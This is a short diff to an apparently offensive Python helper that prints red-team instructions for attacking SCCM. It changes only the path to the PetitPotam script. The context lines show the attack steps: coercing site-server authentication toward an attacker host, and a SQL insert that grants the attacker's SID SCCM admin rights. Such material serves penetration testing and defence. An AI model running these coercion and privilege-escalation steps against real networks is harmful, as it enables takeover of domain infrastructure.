@@ -200,7 +200,7 @@ def run():
     --objectsid '{target_sid}'
 
   {Y}Terminal 2 — Coerce site server auth:{RST}
-  python3 PetitPotam.py \\
+  python3 tools/PetitPotam/PetitPotam.py \\
     -u '{user}' -p '{pw}' \\
     {attacker} {sccm_ip}
 
@@ -243,7 +243,7 @@ def run():
         VALUES (0x<your_sid>,'{dom}\\{user}',0,0,'',GETDATE(),'',GETDATE(),'<SITE>');"
 
   {Y}Terminal 2 — Coerce site server:{RST}
-  python3 PetitPotam.py \\
+  python3 tools/PetitPotam/PetitPotam.py \\
     -u '{user}' -p '{pw}' \\
     {attacker} {sccm_ip}
 
